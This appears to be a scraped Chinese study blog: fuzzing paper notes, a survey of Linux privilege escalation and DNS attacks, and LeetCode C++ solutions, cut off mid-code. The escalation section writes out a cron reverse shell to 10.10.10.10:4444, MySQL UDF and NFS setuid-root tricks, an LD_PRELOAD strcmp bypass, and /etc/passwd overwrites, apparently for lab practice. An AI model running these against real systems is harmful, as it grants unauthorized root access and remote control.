introduction大量的种子调度策略被提出。一般来说，这些策略的目的是根据一定的标准为每个种子分配一个分数，然后选择分数最高的种子进行下一次的模糊迭代。例如，AFL偏好于具有最小尺寸和最短执行时间的种子。这些策略独立地对待这些种子，并没有明确地考虑种子之间的关系。 “种子变异树”的主要优点是有利于种子调度在利用式(即,反复锻炼一个高电位的种子和它的邻居)和探索式(即,尝试一个很少锻炼的种子)之间进行平衡，以获得最佳性能。如上所述，种子调度是指为探索其邻居路径而选择一条执行路径。利用种子之间的关系，我们可以进一步将每个种子对应的路径组织为一个树结构，记为执行树。 论文贡献 新见解。我们重点观察到种子之间的关系对于种子调度是有价值的。我们研究并利用种子变异关系来构建一个”种子变异树”，它是模糊测试执行树的近似，可以进一步帮助种子调度平衡利用和探索。 新的fuzzing技术。利用”种子变异树”，我们将种子调度问题建模为蒙特卡洛树搜索( MCTS )问题，并提出了基于MCTS的种子调度策略。由于MCTS算法的性质，该策略在利用和探索之间取得了平衡。 种子变异树种子变异树被定义成一个三元组，T = (V, E, 𝛼),V是种子，E是边，𝛼是突变关系 最初，树由根节点和几个初始种子的节点构成 选择一个种子变异，生成新的测试用例。然后，将新生成的覆盖新路径的测试用例作为原始种子的子代加入到”种子变异树”中。 一些特殊的突变可能作用于两个种子。例如，AFL中剪接体的突变会将一个种子与第二个种子进行剪接，产生新的输入。在这种情况下，我们只在新节点和第一个种子对应的节点之间构造一条边，因为第一个种子是通过种子调度策略选择的，而第二个种子是随机选择的。 三个挑战 搜索空间大且不断增大。因此，我们需要一个启发式算法来提供当前的最佳决策。 启发式算法的核心是给种子分配分数。然而，随着模糊测试对其相邻路径的探索越来越深入，种子覆盖路径的得分可能会下降。因此，在每次模糊迭代后更新树上所有种子的得分是必要的，但也是具有挑战性的。 很难平衡开发和利用。由于模糊测试本质上的随机化特性的影响，经过一次模糊测试迭代后计算出的种子评分会受到这种不确定性的影响。因此，如何在这些不确定因素下平衡开发和利用是一个挑战。 蒙特卡洛搜索MCTS是一种通过基于随机抽样的顺序构建树进行最优决策的算法。该过程包括四个步骤： 选择。MCTS采用特定的树策略，从根节点R开始，递归地选择最优的子节点，直到达到一个叶节点L。 扩张。如果L不是终端节点，则MCTS创建一个或多个子节点。进一步，从这些子节点中选择一个节点C。在这一步中，子节点指的是来自L定义的状态的任何有效移动。 仿真。通过随机选择动作来执行，直到达到一个结果或预定义的状态。 反向传播。这一步回传从新节点C传播到根节点R，更新仿真结果。 树的置信上界（UCB）：UCB公式平衡了对已知奖励的利用和对相对未访问节点的探索，以获得最佳性能。 基于蒙特卡洛的种子调度算法MCTS从根节点开始，在每个层次上选择得分最高的下一个节点，直到达到一个叶节点。然后，模糊测试在监视新生成的输入的执行的同时随机变异所选的种子。由于并不是所有新生成的输入都提高了代码覆盖率，因此我们先进行仿真，只在树中添加提高代码覆盖率的输入。最后，我们在每次模糊迭代后更新种子的得分 树的构建与扩展“种子变异树”中，一个内部节点有两种不同的角色。首先，它指的是种子。其次，从树的结构来看，它也是子树的根节点。因此，一个内部节点即使有多个子节点也可以被选为种子。作为种子，分数是指选择该种子的模糊度得分。作为子树的根节点，分数指的是选择子树中每个种子的摘要模糊度得分。 为了解决这种不相容性，我们通过为每个内部节点插入一个变异节点来更新”种子变异树”。内部节点指其子树的根节点，变体指其对应的种子。这样，变体将是内部节点的一个叶子节点。对于模糊得分，内部节点指子树中每个种子的模糊得分汇总。相比之下，变体是指对应种子的模糊度评分。 Not All Coverage Measurements Are Equal: Fuzzing by Coverage Accounting for Input Prioritization背景知识 论文中提到的，以及我个人需要读懂这篇论文，需要进行补充的背景知识 taint analysis污点分析可以抽象成一个三元组&lt;sources, sinks, sanitizers&gt;的形式。sources：污点源，代表直接引入不受信任的数据或者机密数据到系统中。sink：污点汇聚点，代表直接产生安全敏感操作或者泄露隐私数据到外界。sanitizer：无害处理，代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害。 污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点.如果不能,说明系统是信息流安全的;否则,说明系统产生了隐私数据泄露或危险数据操作等安全问题。 污点分析的处理过程可以分成 3 个阶段: (1) 识别污点源和汇聚点; (2) 污点传播分析; (3) 无害处理. 符号执行 参考 参考论文–SymQEMU:Compilation-based symbolic execution for binaries符号执行 （Symbolic Execution）是一种程序分析技术，它可以通过分析程序来得到让特定代码区域执行的输入。顾名思义，使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。在理想模型中，程序使用的每个符号变量均应该是一个有符号整数。 符号执行技术近年来大力发展，一种有效但是代价大的技术，其经常与fuzzing技术混合，并成为混合fuzzing，fuzzing用来探索容易到达的路径，而符号执行用来探索不易到达的路径。 针对符号执行技术的重要特征之一就是其是否需要提供源代码进行分析，而真实世界中的大多数程序(由于某些原因)是不提供源代码的。 白盒测试（structure）主要专注于测试系统内部的结构，因此需要尽可能的在测试中覆盖到所有必要的要素。 statement coverage/node coverage: test case要确保尽可能覆盖到所有的node（每一个操作在控制流程图(CFG)中就是一个圆角方框即node） decision coverage/edge coverage: test case要确保尽可能覆盖到所有的edge，（即所有的箭头） condition coverage: 这是针对代码中测试的条件语句，每个条件要尽量cover到其所有正确或错误的结果，主要有两种写test case的方法 simple: 针对条件语句中所有的条件，每个条件都需要至少有一个T和一个F的情况包括在内（这个情况称为满足simple condition coverage），但是仅仅是针对一个语句里的子条件，整个条件语句的结果可能不会满足一定有T和F（这种情况为满足condition coverage）。 multiple: 这种方法就是不仅要满足每个子条件有T有F还要将所有可能的子条件的组合情况给列出来 path coverage: 在test case中需要尽量包括所有的路径（即到每一个可能终点的可能路径），值得注意的是如果没有循环才可能cover到所有的情况，即使只有一个循环也无法cover到所有的情况 loop coverage: 其实算是path coverage的一部分，其旨在测试代码中的循环。 anti-fuzzing techniques反模糊化技术通过插入伪路径、在错误处理代码中添加延迟、模糊代码以减缓动态分析来欺骗模糊测试。 CGF(Coverage-guided Fuzzing)fuzzing是一种自动生成和测试输入以发现软件漏洞的程序测试技术。它不需要对程序的理解，也不需要人工生成测试用例，具有灵活性，容易适用于不同的程序。 覆盖率引导的模糊测试以一个初始输入(种子)和一个目标程序作为输入，产生触发程序错误的输入作为输出。它重复选择一个输入，用输入运行目标程序，并根据当前输入及其运行结果生成新的输入。 文章贡献 提出了coverage accounting，输入优化的新方法 开发了TortoiseFuzz，基于coverage accounting的灰盒fuzzer coverage accounting对edges度量，进行输入优化，通过对输入进行优先级排序，缩短发现漏洞的时间；为了抵御anti-fuzzing，不依赖于污点分析或者符号执行。 从函数调用，循环和基本块三个粒度分别对edge进行度量。 函数调用：从CVE以及其子页面中爬取数据，总结出一些易于出现问题的库函数的数据表。根据这些数据表，计算一个edge目的基本块中调用这些易于出现问题的库函数的函数个数 循环：若e是back edge（回边，其头是其尾的必经结点），则为1，否则为0 基本块：目的基本块中包含内存操作的指令个数 TORTOISEFUZZ的设计fuzzer的设计目的是结合coverage accounting，对更容易导致脆弱代码的输入进行优先级排序，同时保证优先输入覆盖足够的代码 由于内存操作是内存错误的先决条件，所以只有安全敏感的edges才是漏洞的关键，因此应该被选择的输入完全覆盖。 通过coverage accounting的计算，并设置一个域值，当超过域值时，认为是安全敏感的 在输入的选择上，输入越是命中安全敏感的edges，越有可能演化为触发漏洞 可疑基本块导向的定向模糊测试技术研究核心内容 利用静态污点分析筛选出目标程序所有可疑基本块，再通过函数间控制流分析得出基本块之间的可达性，以提取可到达可疑基本块集合的所有基本块 这篇文章分析了三种问题：缓冲区溢出、整形溢出、移位位数过大的特征，使用污点分析方法找到这些特征所在的代码块。 将可疑基本块以及可以到达这些块的块作为插桩对象，除此之外，无法到达该可疑基本块的块则不插桩，以此降低桩代码引入的额外开销。 计算所有基本块到可疑基本块集合的距离，根据该距离赋予基本块权重，距离越小权重越大 根据种子所触发路径上各基本块的权重计算其变异后漏洞发现概率，变异时优先选择漏洞发现概率更高的种子，借此优化种子选择过程，提高模糊测试漏洞挖掘效率。","link":"/home/2023/02/12/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E4%BA%94%E5%91%A8%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/"},{"title":"DNS第四周调研","text":"主机提权 参考 蓝桥杯教程 tryHackme，这是一个靶场，提供了21个主机提权的task UDF提权 UDF全名user-defined function capability 它可以通过对MYSQL中的函数调用连接系统上可用的系统动态库 UDF攻击条件 必须获得MYSQL的账号最好是root，然后去到MYSQL里面检查是否拥有insert插入权限，检查命令: select User,Host from user where Insert_priv='Y';是否有输出 可以更改数据库当然拿到root最好 允许拷贝文件进来(检查命令: show variables like 'local_infile';结果为ON才行) 攻击流程 首先攻进去并且获得一个MYSQL数据库账号且权限比较高 上传一个恶意的动态库文件 在进入MYSQL以后通过insert函数把动态库文件存储进来 搭建连接 执行 复现过程,首先需要准备好文件，kali上已有(raptor_udf2.so) 创建do_system函数 执行函数 1select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash'); 启动这个bash 1/tmp/rootbash -p 可读的/etc/shadow文件/etc/shadow和/etc/passwd上面都会存储着这台机子上的用户密码信息。passwd可读但不会显示具体密码，理论上来讲只有root才能改。而shadow有加密的账号密码信息但是一般来讲是不可读的。这里假设我们拥有对/etc/shadow的读写权限。 保存成文本信息，可用john进行解密。最后得到密码。 可写的/etc/shadow文件通过john获取/etc/shadow的加密方法，使用相同的加密方法将密码替换 可写的/etc/passwd文件使用以下命令生成加密后的密码，修改/etc/passwd中root的密码 1openssl passwd 123456 sudo提权 sudo提权参考 在Linux/Unix中，/etc/sudoers文件是sudo权限的配置文件，其中储存了一些用户或组可以以root权限使用的命令。通过sudo -l可以查看用户能以root权限运行的命令 可以利用sudo提权的命令如下 1wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp、ed、screen 在/etc/sudoers中需要有以下内容 123456789hacker ALL=(root) NOPASSWD: /usr/bin/awkhacker ALL=(root) NOPASSWD: /usr/bin/vimhacker ALL=(root) NOPASSWD: /usr/bin/manhacker ALL=(root) NOPASSWD: /usr/bin/apache2hacker ALL=(root) NOPASSWD: /usr/bin/lesshacker ALL=(root) NOPASSWD: /bin/morehacker ALL=(root) NOPASSWD: /usr/bin/findhacker ALL=(root) NOPASSWD: /usr/bin/ziphacker ALL=(root) NOPASSWD: /usr/bin/git hacker用户可以以root身份运行awk, vim 等命令即可 攻击流程每个命令具体的攻击流程在上面的参考中有写 环境变量提权LD_LIBRARY_PATH : 提供首先会在某些动态库里面列出会使用到哪些动态库 LD_PRELOAD : 在某个程序运行前先加载一个对象 一个preload.c的例子123456789/* 文件名：preload.c */#include&lt;stdio.h&gt;int strcmp(const char *s1, const char *s2){ printf(&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n&quot;, s1, s2); /* 永远返回0，表示两个字符串相等 */ return 0;} 如果登录验证时使用了strcmp函数比较输入字符串和密码是否相同，替换该函数，使得strcmp永远返回0。 cron job提权假设root会定期使用cron执行overwrite.sh这个脚本，找到这个脚本发现该脚本是可编辑的，将该脚本的替换成以下内容 12#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1 创建一个交互式的bash，并将输入输出重定向到 /dev/tcp/10.10.10.10/4444 socket连接上。 cron 环境变量提权在/etc/crontab中显示的环境变量$PATH是从/home/user找起，而root执行的overwrite.sh在usr/local/bin中，可以在/home/user下写入一个overwrite.sh文件来提权 123#!/bin/bashcp /bin/bash /tmp/rootBashchmod +xs /tmp/rootBash 查看历史寻找敏感信息查看输入命令的历史，看其中是否有密码、敏感信息 1cat ~/.*history NFS提权在NFS中，如果配置了root_squash，当使用root用户登录访问时，会将root用户转换成匿名用户。此时他的uid和gid都会变成nobody账号的身份。如果配置了no_root_squash，则会以root身份直接访问。 此时在nfs中创建文件 123456int main() { setpid(0); setgid(0); system(&quot;/bin/bash/&quot;); return 0;} 对他进行编译，等待编译后的文件同步到靶机上，进行执行，即可提权 Capability提权从2.1版本以后Linux开始引入capability让普通用户也可干root可做的事。capability可让某个程序拥有超能力而sudo只是针对某个用户/文件赋予它SUID(超能力)。 使用该命令可以找到具有cap_setuid能力的程序，具体提权方法可以查找gtfobin 1getcap -r 2&gt;/dev/null 内核提权dirtycow可以对内核版本2.6左右的系统进行提权，可以借助linux-exploit-suggester等工具查询提权方法。 提权相关漏洞 CVE-2019-19495，web页面设计问题导致页面收到DNS rebinding攻击，使外部能够访问root shell CVE-2019-12511，通过向”NETGEAR Genie” SOAP 端点发送特制的MAC地址，就可以以root用户身份执行任意系统命令 CVE-2000-1029，CVE-2002-0029，CVE-2002-0684，Buffer overflow导致攻击方可以以root身份执行任意命令 CVE-2001-0013，字符串格式化问题导致攻击者获取riit权限 ISC » Bind : Vulnerability Statistics显示了历年找到的bind中的各类bug 域名解析服务扰乱 (三类) 参考1–简析DNS攻击的常见类型、危害与防护建议 参考2–On the Anatomy of a DNS Attack – Types, Technical Capabilities, and Mitigation 参考3–Attacks Against The DNS 拒绝服务(DoS)类攻击通过耗尽机器或网络的资源将其服务关闭，阻止用户访问机器或网络。需要强调的是，这种攻击的目的主要用于隐藏踪迹或阻碍受害者恢复工作。 DNS放大 Reflection Attack Reflection Attack And Amplification Attack Distributed Reflection And Amplification Attack DNS放大是DoS攻击中用于利用域名系统并加大目标网站流量的一种技术。这种攻击方法利用的主要技术包括DNS反射和地址伪造。不法分子实施这种攻击的手法是，向域名系统服务器发送伪造的IP数据包，请求目标的域名，使用目标的IP地址代替自己的IP地址。 所有这些查询都由DNS服务器用目标机器的IP地址来答复。然后，受害者的服务器向每个请求发送相同的答复。这导致庞大的数据流量从受害者网络的端口80或25流入。 伪造DNS请求，并替换请求中的源地址替换成攻击对象(target)的地址，称为Reflection Attack，如果在此基础上向DNS发送大量的请求，使target80/25端口接收过多攻击，称为Reflection Attack And Amplification Attack，如果多个Attacker对DNS发起此类虚假的请求，称为Distributed Reflection And Amplification Attack SYN Flood (Resource Depletion DOS Attack) 利用target的ip发起TCP连接，DNS为TCP连接分配资源，最终导致Fail，停止服务 Basic Cache Poisoning 令本地解析器缓存错误的ip地址 NXDOMAIN Cache Exhaustion 攻击者向DNS服务器发送大量不存在的域名的查询请求，导致DNS服务器中存储了大量NXDOMAIN信息，导致其缓存溢出，停止服务 Dos e.g. Exploit To Fail，Malicious DNS message injection–(CVE-2002-0400) Exploit a vulnerability in some element of a name server infrastructure to cause interruption of name resolution service，利用DNS服务器基础结构的某些元素中的漏洞导致名称解析服务中断 Exploit To Own，Arbitrary/remote code execution Exploit a vulnerability in some element of a name server infrastructure to gain system administrative privileges，利用DNS服务器基础结构的某些元素中的漏洞获得系统管理特权 Reflection Attack， 分布式拒绝服务(DDoS)类攻击 UDP Flood HTTP Flood 这两个和SYN Flood相似，发送大量请求导致target资源不足而崩溃 反射式跨站点脚本(XSS) 当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。 通过DNS TXT记录在上注入恶意脚本，当通过Whois服务检查他的域时，脚本会立即执行。 DNS 劫持类攻击发生DNS劫持攻击时，网络攻击者会操纵域名查询的解析服务，导致访问被恶意定向至他们控制的非法服务器，这也被成为DNS投毒或DNS重定向攻击。DNS 劫持攻击在网络犯罪领域也很常见。DNS劫持活动还可能破坏或改变合规DNS服务器的工作。除了实施网络钓鱼活动的黑客外，这还可能由信誉良好的实体(比如ISP)完成，其这么做是为了收集信息，用于统计数据、展示广告及其他用途。此外，DNS服务提供商也可能使用流量劫持作为一种审查手段，防止访问特定页面。 通过恶意AP，路由器将DNS请求重定向到攻击者的DNS服务器上 DNS欺骗DNS欺骗又叫DNS缓存中毒，是网络犯罪分子用来诱骗用户连接到他们建立的虚假网站而不是合法网站的一种方法。有人通过域名系统请求访问网站，而DNS服务器回应不准确的IP地址时，这被认为是DNS欺骗攻击。然而，不仅仅是网站容易受到这种攻击。黑客还可以使用这种方法，访问电子邮件账户及其他私密数据。 DNS返回的数据被篡改，返回了不准确的IP地址 Configuration Poisoning: DNSChanger 通过恶意软件修改DNS的配置文件 DNS Hostname Overflow Attack 攻击者返回的消息中包含大于255字节的域名，导致Buffer溢出，使得攻击者可以获得root或执行特权指令 DNS隧道网络流量可以使用DNS隧道的方式绕过网络过滤器和防火墙等机制，以建立另外的数据传输通道。启用DNS隧道后，用户的连接将通过远程服务器路由传输互联网流量。不幸的是，黑客经常将此用于恶意目的。被恶意使用时，DNS隧道是一种攻击策略，数据通过DNS查询来传递。除了通过平常会阻止这类流量的网络秘密发送数据外，这还可用于欺骗内容、避免过滤或防火墙检测。 利用DNS进行隐蔽通信 DNS重新绑定DNS重新绑定是一种网络攻击方法，利用浏览器缓存的长期特性，欺骗受害者的浏览器在输入域名时联系恶意站点。攻击者可以使用任何联网设备（包括智能手机）来实施攻击，不需要任何类型的身份验证。受害者必须禁用浏览历史记录或打开浏览器隐身窗口，才能禁用缓存。利用该漏洞，攻击者可以将受害者浏览器对域名的请求，重新路由到托管有害内容的非法服务器。 一般来说我们的操作系统默认能够将DNS返回来的这个IP地址信息保存60秒，而超过60秒后如果需要再次访问这个域名，就会重新去请求一次dns 对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。这样的行为被称之为域名重新绑定攻击（DNS ReBinding）。 用户第一次访问，解析域名test.gm7.org的IP为104.21.26.222 在用户第二次访问前，修改域名解析的IP为127.0.0.1 用户第二次访问，解析域名test.gm7.org的IP为127.0.0.1 (一个不同的ip) DNS拼写仿冒DNS拼写仿冒是一种受DNS劫持启发的社会工程攻击技术，它使用域名中的错别字和拼写错误。常见的DNS拼写仿冒攻击始于攻击者注册一个域名，这个域名和目标的网站域名非常相似。攻击者随后搭建一个虚假网站，网站内容旨在说服用户提供敏感信息，包括登录密码、信用卡资料及其他个人信息。 DNS拼写仿冒是社工技术的一种方法，攻击方注册一个和网站相似的域名来混淆用户。常见在登录密码以及识别验证方面。","link":"/home/2023/02/02/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%B0%83%E7%A0%94/"},{"title":"LeetCode-21","text":"1234. 替换子串得到平衡字符串12345678910111213141516171819202122232425262728293031class Solution {public: bool isBalance(int* count, int avg) { return count['Q'] &lt;= avg &amp;&amp; count['R'] &lt;= avg &amp;&amp; count['E'] &lt;= avg &amp;&amp; count['W'] &lt;= avg; } int balancedString(string s) { int count[128] = {0}; for (char c : s) { count[c]++; } int len = s.length(); int avg = len / 4; if (isBalance(count, avg)) { return 0; } int res = len; for (int l = 0, r = 0; l &lt; len; l++) { while (r &lt; len &amp;&amp; !isBalance(count, avg)) { count[s[r]]--; r++; } if (!isBalance(count, avg)) { break; } res = min(res, r - l); count[s[l]]++; } return res; }}; 1138. 字母板上的路径123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class Solution {public: string alphabetBoardPath(string target) { int x = 0, y = 0; string res = &quot;&quot;; for(char c : target) { int next_x = getX(c), next_y = getY(c); char step_x = 'L', step_y = 'U'; int diff_x = x - next_x, diff_y = y - next_y; if(next_x &gt; x) { step_x = 'R'; diff_x = -diff_x; } if(next_y &gt; y) { step_y = 'D'; diff_y = - diff_y; } if(next_y == 5) { for(int i = 0; i &lt; diff_x; i++) { res += step_x; } for(int i = 0; i &lt; diff_y; i++) { res += step_y; } } else { for(int i = 0; i &lt; diff_y; i++) { res += step_y; } for(int i = 0; i &lt; diff_x; i++) { res += step_x; } } res += &quot;!&quot;; x = next_x; y = next_y; } return res; } int getX(char c) { return (c - 'a') % 5; } int getY(char c) { return (c - 'a') / 5; }}; 如果默认先纵向走，再横向走，那么当从外部到z时，需要先横向走再纵向走如果默认先横向走，再纵向走，那么当从z到外部时，需要先纵向走再横向走 2335. 装满杯子需要的最短总时长12345678910111213141516171819202122232425262728293031323334353637class Solution {public: int fillCups(vector&lt;int&gt;&amp; amount) { int res = 0; int x,y; int minn = 0; if(amount[0] == 0 || amount[1] == 0 || amount[2] == 0) { if(amount[0] == 0) minn = 0; if(amount[1] == 0) minn = 1; if(amount[2] == 0) minn = 2; } else { if(amount[1] &lt; amount[minn]) { minn = 1; } if(amount[2] &lt; amount[minn]) { minn = 2; } int a,b; if(amount[(minn+1)%3] &gt; amount[(minn + 3 - 1) % 3]) { a = (minn+1)%3; b = (minn + 3 - 1) % 3; } else { b = (minn+1)%3; a = (minn + 3 - 1) % 3; } res += amount[minn]; int diff = min(amount[a] - amount[b], amount[minn]); amount[minn] -= diff; amount[a] -= diff; amount[a] -= amount[minn]/2; amount[b] -= amount[minn] - amount[minn]/2; amount[minn] = 0; } res += max(amount[(minn + 3 - 1) % 3], amount[(minn+1)%3]); return res; }}; 假设初始状态，三杯水的需求量都大于0。选最少的一种，让他和另外两种水一起接，并且尽量让另外两杯水的需求量相近，处理好最少的一种后，最少的一种就变成了0对于剩下的两中温度，操作数就是最大的那个温度如果初始有一个为0，则将minn初始化为对应下标由于只有3个，可以取余减少重复代码 1797. 设计一个验证系统1234567891011121314151617181920212223242526class AuthenticationManager {public: unordered_map&lt;string, int&gt; live; int timeToLive; AuthenticationManager(int timeToLive) { this-&gt;timeToLive = timeToLive; } void generate(string tokenId, int currentTime) { live[tokenId] = currentTime + timeToLive; } void renew(string tokenId, int currentTime) { if(!live.count(tokenId) || live[tokenId] &lt;= currentTime) return; live[tokenId] = currentTime + timeToLive; } int countUnexpiredTokens(int currentTime) { int count = 0; for(auto ite = live.begin(); ite != live.end(); ite++) { if(ite-&gt;second &gt; currentTime) count++; } return count; }}; 1250. 检查「好数组」123456789101112131415161718class Solution {public: bool isGoodArray(vector&lt;int&gt;&amp; nums) { int gcd_ = nums[0]; int n = nums.size(); for(int i = 0; i &lt; n; i++) { gcd_ = gcd(nums[i], gcd_); if(gcd_ == 1) return true; } return false; } int gcd(int a, int b) { if(a &lt; b) return gcd(b, a); if(b == 0) return a; return gcd(b, a%b); }}; 根据提示 $ Eq. ax+by=1 has solution x, y if gcd(a,b) = 1. $只要整个数组的最大公约数为1，则可满足题意 1233. 删除子文件夹12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364struct MTreeNode { unordered_map&lt;string, MTreeNode*&gt; childList;};class Solution {public: vector&lt;string&gt; res; vector&lt;string&gt; removeSubfolders(vector&lt;string&gt;&amp; folder) { MTreeNode * root = new MTreeNode(); for(string&amp; dir : folder) { vector&lt;string&gt; dirs = splitPath(dir); MTreeNode* move = root; int dir_len = dirs.size(); for(int i = 0; i &lt; dir_len; i++) { if(!move-&gt;childList.count(dirs[i])) { move-&gt;childList[dirs[i]] = new MTreeNode(); } move = move-&gt;childList[dirs[i]]; } } for(string&amp; dir : folder) { vector&lt;string&gt; dirs = splitPath(dir); MTreeNode* move = root; int dir_len = dirs.size(); for(int i = 0; i &lt; dir_len; i++) { if(!move-&gt;childList.count(dirs[i])) { break; } move = move-&gt;childList[dirs[i]]; } move-&gt;childList.clear(); } dfs(root, &quot;&quot;); return res; } void dfs(MTreeNode* root, string path) { if(root-&gt;childList.size() == 0) { res.push_back(path); return; } for(auto ite = root-&gt;childList.begin(); ite != root-&gt;childList.end(); ite++) { dfs(ite-&gt;second, path+&quot;/&quot;+ite-&gt;first); } } vector&lt;string&gt; splitPath(string s) { vector&lt;string&gt; path; int i = 0; int n = s.size(); while(i &lt; n) { string dir; while(i &lt; n &amp;&amp; s[i] == '/') i++; if(i &lt; n) { while(i &lt; n &amp;&amp; s[i] != '/') { dir.push_back(s[i]); i++; } path.push_back(dir); } } return path; }}; 模拟，构造那棵树，删除，然后还原 12执行用时：620 ms, 在所有 C++ 提交中击败了5.15%的用户内存消耗：213.6 MB, 在所有 C++ 提交中击败了4.99%的用户 我不管，这是O(n)，就是最快的 123456789101112131415161718192021class Solution {public: vector&lt;string&gt; res; vector&lt;string&gt; removeSubfolders(vector&lt;string&gt;&amp; folder) { sort(folder.begin(), folder.end()); int cmp = 0; int i = 1, n = folder.size(), cmp_len = folder[cmp].length(); res.push_back(folder[cmp]); for(; i &lt; n; i++) { int j; for(j = 0; j &lt; cmp_len &amp;&amp; folder[cmp][j] == folder[i][j]; j++); if(j == cmp_len &amp;&amp; folder[i][j] == '/') { } else { cmp = i; cmp_len = folder[cmp].length(); res.push_back(folder[cmp]); } } return res; }}; 排序，比较 1210. 穿过迷宫的最少移动次数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960class Solution {public: int minimumMoves(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { int n; n = grid.size(); queue&lt;pair&lt;pair&lt;int, int&gt;, int&gt;&gt; que; if(n &lt;= 0) return 0; vector&lt;vector&lt;vector&lt;bool&gt;&gt;&gt; visited(n, vector&lt;vector&lt;bool&gt;&gt;(n, vector&lt;bool&gt;(2, false))); que.push(make_pair(make_pair(0,0),0)); int step = 0; while(!que.empty()) { queue&lt;pair&lt;pair&lt;int, int&gt;, int&gt;&gt; que_temp; while(!que.empty()) { auto [pos, ver] = que.front(); auto [x, y] = pos; visited[x][y][ver] = true; que.pop(); if(x == n-1 &amp;&amp; y == n-2 &amp;&amp; !ver) {return step;} if(ver) { if(x+2 &lt; n &amp;&amp; !grid[x+2][y]) { if(!visited[x+1][y][1]) { que_temp.push(make_pair(make_pair(x+1,y),1)); visited[x+1][y][1] = true; } } if(y+1 &lt; n &amp;&amp; x+1 &lt; n &amp;&amp; !grid[x][y+1] &amp;&amp; !grid[x+1][y+1]) { if(!visited[x][y][0]) { que_temp.push(make_pair(make_pair(x,y),0)); visited[x][y][0] = true; } if(!visited[x][y+1][1]) { que_temp.push(make_pair(make_pair(x,y+1),1)); visited[x][y+1][1] = true; } } } else { if(y+2 &lt; n &amp;&amp; !grid[x][y+2]) { if(!visited[x][y+1][0]) { que_temp.push(make_pair(make_pair(x,y+1),0)); visited[x][y+1][0] = true; } } if(y+1 &lt; n &amp;&amp; x+1 &lt; n &amp;&amp; !grid[x+1][y] &amp;&amp; !grid[x+1][y+1]) { if(!visited[x][y][1]) { que_temp.push(make_pair(make_pair(x,y),1)); visited[x][y][1] = true; } if(!visited[x+1][y][0]) { que_temp.push(make_pair(make_pair(x+1,y),0)); visited[x+1][y][0] = true; } } } } step++; que = que_temp; } return -1; }}; 经典的BFS 2341. 数组能形成多少数对123456789101112131415161718192021class Solution {public: vector&lt;int&gt; numberOfPairs(vector&lt;int&gt;&amp; nums) { unordered_map&lt;int, bool&gt; m; int len = nums.size(); for(int n:nums) { if(m.count(n)) { m[n] = !m[n]; } else { m[n] = true; } } int res = 0; for(auto ite = m.begin(); ite != m.end(); ite++) { if(ite-&gt;second) { res++; } } return {(len - res) &gt;&gt; 1, res}; }}; 1139. 最大的以 1 为边界的正方形1234567891011121314151617181920212223242526272829303132333435363738394041class Solution {public: int largest1BorderedSquare(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { int m = grid.size(), n = grid[0].size(); vector&lt;vector&lt;int&gt;&gt; up(m, vector&lt;int&gt;(n, 0)), down(m, vector&lt;int&gt;(n, 0)), left(m, vector&lt;int&gt;(n, 0)), right(m, vector&lt;int&gt;(n, 0)); for(int i = 0; i &lt; m; i++) { left[i][0] = grid[i][0]; right[i][n-1] = grid[i][n-1]; for(int j = 1; j &lt; n; j++) { if(grid[i][j]) left[i][j] = left[i][j-1] + 1; else left[i][j] = 0; if(grid[i][n-1-j]) right[i][n-1-j] = right[i][n-j] + 1; else right[i][n-1-j] = 0; } } for(int i = 0; i &lt; n; i++) { up[0][i] = grid[0][i]; down[m-1][i] = grid[m-1][i]; for(int j = 1; j &lt; m; j++) { if(grid[j][i]) up[j][i] = up[j-1][i] + 1; else up[j][i] = 0; if(grid[m-1-j][i]) down[m-1-j][i] = down[m-j][i] + 1; else down[m-1-j][i] = 0; } } int maxx = 0; for(int i = 0; i &lt; m; i++) { for(int j = 0; j &lt; n; j++) { if(grid[i][j]) { int diff = min(down[i][j], right[i][j]); for(int l = 0; l &lt; diff; l++) { if(l-up[i+l][j+l]+1 &lt;= 0 &amp;&amp; l-left[i+l][j+l]+1 &lt;= 0) { maxx = max(maxx, l+1); } } } } } return maxx*maxx; }}; 记录上下左右四个方向从位置(i, j)开始连续的1的个数对于一个为1的点，在其下方和右方有连续1的范围内的斜对角上的各点，如果斜对角线上各点的上方和左方能和(i,j)的下方和右方围成正方形，则更新最大值。 1663. 具有给定数值的最小字符串1234567891011class Solution {public: string getSmallestString(int n, int k) { string res(n, 'a'-1); for(int i = n-1; i &gt;= 0; i--) { res[i] += min(26, k-i); k -= min(26, k-i); } return res; }}; 1234567891011121314class Solution {public: string getSmallestString(int n, int k) { string res(n, 'a'); int i = n-1; k-=n; for( ; k &gt;= 26; i--) { res[i] += 25; k -= 25; } res[i] += k; return res; }}; 1237. 找出给定方程的正整数解暴力搜索1234567891011121314class Solution {public: vector&lt;vector&lt;int&gt;&gt; findSolution(CustomFunction&amp; customfunction, int z) { vector&lt;vector&lt;int&gt;&gt; res; int x, y; for(x = 1; x &lt;= 1000; x++) { for(y = 1000; y &gt; 1 &amp;&amp; customfunction.f(x,y) &gt; z; y--); if(customfunction.f(x,y) == z) { res.push_back({x, y}); } } return res; }}; 二分查找123456789101112131415161718192021222324252627282930313233343536/* * // This is the custom function interface. * // You should not implement it, or speculate about its implementation * class CustomFunction { * public: * // Returns f(x, y) for any given positive integers x and y. * // 